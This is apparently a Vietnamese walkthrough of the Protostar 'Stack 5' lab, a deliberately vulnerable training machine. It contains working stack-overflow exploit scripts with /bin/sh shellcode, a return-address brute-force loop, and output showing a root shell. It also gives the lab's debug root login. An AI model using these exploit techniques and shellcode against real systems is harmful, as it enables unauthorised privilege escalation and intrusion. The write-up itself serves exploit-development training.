## Stack 5

Lần này không có hàm nào để rewrite return address rồi trả về cả. Đây là lúc dùng để shellcode, ta sẽ viết shellcode ngay trên stack, rewrite địa chỉ trả về đến vị trí bắt đầu của shellcode, shellcode lúc này sẽ spawn cho ta một con shell.

### Approach #1: attach debug
Cách tiếp cận đầu tiên là attach debug vào file binary, do stack của file khi debug bằng gdb và khi chạy ngoài sẽ rất khác nhau, do GDB đưa thêm nhiều thứ của nó vào nữa nên địa chỉ của mọi thứ sẽ bị lệch nhau

Protostar có cung cấp cho ta một account root là `root:godmode` dùng để debug, login bằng account này. Sau đó ta chạy file binary `stack5`, chương trình sẽ hang để chờ input, lúc này ta chạy lệnh `ps -aux` để tìm tiến trình của file binary và dùng gdb attach: `gdb -p <pid>`

Chuyển sang chương trình, ta thử nhập `AAAA` vào, ta sẽ thấy địa chỉ của biến `buffer` là `0xbffff6f0`, địa chỉ trả về thì sẽ nằm ở `0xbffff73c` (break tại `ret` sẽ thấy), vậy khoảng cách giữa 2 địa chỉ là 76 bytes, ta sẽ padding 76 bytes, từ byte thứ 77 sẽ là địa chỉ mà ta muốn nhảy tới sau lệnh `ret`, đó là địa chỉ của shellcode trên stack, ta sẽ để shell code ở ngay địa chỉ tiếp theo, địa chỉ `0xbffff73c+4`

```python 
import struct

padding = "A"*76
eip = struct.pack("I",0xbffff73c+4)
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

print padding+eip+shellcode
```

Về shellcode thì mình dùng shellcode này https://shell-storm.org/shellcode/files/shellcode-827.html, shellcode thực chất chỉ là một đoạn assembly được compile qua bytecode thôi, đoạn shellcode trên sẽ thực thi `/bin/sh`

Chứa output tại một file tên `payload` rồi đưa vào file binary

```
user@protostar:/opt/protostar/bin$ ./stack5 < ~/payload
user@protostar:/opt/protostar/bin$ 
```

Không có gì xảy ra, đây là do thực chất `/bin/sh` đã gọi, nhưng `/bin/sh` thì cần input vào là các commands, nhưng chương trình của chúng ta thì sau khi nhận input (lúc gọi lệnh `gets`) thì nó sẽ đóng stdin pipe, do đó chương trình sẽ đóng do không có input nào. Do đó ta sẽ dùng một cách:
```
(cat /home/user/payload ; cat) | ./stack5
```

Đầu tiên `cat /home/user/payload` sẽ đưa payload ta chuẩn bị sẵn vào stdin của ./stack5, cùng với đó là `cat`, như ta biết nếu `cat` được thực thi mà không có tham số nào thì nó sẽ redirect stdin của nó đến stdout, cứ như thế đến khi nào ta chủ động exit, vậy bằng cách gọi thêm `cat` ta có thể giữ cho stdin của `stack5` luôn mở, dù cho `gets` đã nhận xong input 

```
user@protostar:/opt/protostar/bin$ (cat /home/user/payload ; cat) | ./stack5
ls
final0	final2	 format1  format3  heap0  heap2  net0  net2  net4    stack1  stack3  stack5  stack7
final1	format0  format2  format4  heap1  heap3  net1  net3  stack0  stack2  stack4  stack6


```

### Approach #2: bruteforce

Một cách khác để tiếp cận đó là bruteforce, so sánh địa chỉ chứa return address ta tìm được khi attach debug là `0xbffff73c` với địa chỉ khi debug bằng gdb là `0xbffff6ec` ta sẽ thấy địa chỉ ở GDB thấp hơn so với lúc chương trình chạy bình thường ( là khi attach debug vào ), do gdb nó thêm một đống thứ khác vào stack nữa.

Stack đi từ địa chỉ cao về địa chỉ thấp, vậy để tìm ra địa chỉ đúng của chương trình, ta sẽ bruteforce các địa chỉ `0xbffff6ec+1*4`,`0xbffff6ec+2*4`, ... `0xbffff6ec+n*4` cho đến khi tìm ra địa chỉ đúng

Code:
```python
#!/usr/bin/python

import struct
import os

padding = "A"*76
eip = 0xbffff6ec+4
shellcode = "\x90"*0 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

for i in range(0, 0x90):
    f = open("test.txt","w")
    this_eip = eip + i*4
    pack_eip = struct.pack("I", this_eip)
    f.write(padding+pack_eip+shellcode+b'\n')
    f.close() # close file before cat or else it wont print out result
    print "[*] EIP: {0} ".format(hex(this_eip))
    out_ = os.popen("(cat test.txt ; echo id ) | /opt/protostar/bin/stack5").read()
    if len(out_):
            print out_
            break
```
Result:
```
user@protostar:~$ python brute.py 
[*] EIP: 0xbffff6f0L 
[*] EIP: 0xbffff6f4L 
Segmentation fault
[*] EIP: 0xbffff6f8L 
[*] EIP: 0xbffff6fcL 
[*] EIP: 0xbffff700L 
Segmentation fault
[*] EIP: 0xbffff704L 
Segmentation fault
[*] EIP: 0xbffff708L 
Segmentation fault
[*] EIP: 0xbffff70cL 
Segmentation fault
[*] EIP: 0xbffff710L 
Segmentation fault
[*] EIP: 0xbffff714L 
Segmentation fault
[*] EIP: 0xbffff718L 
Segmentation fault
[*] EIP: 0xbffff71cL 
Segmentation fault
[*] EIP: 0xbffff720L 
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)

```

Vậy tại `0xbffff720` sẽ chứa chứa return address của chương trình 

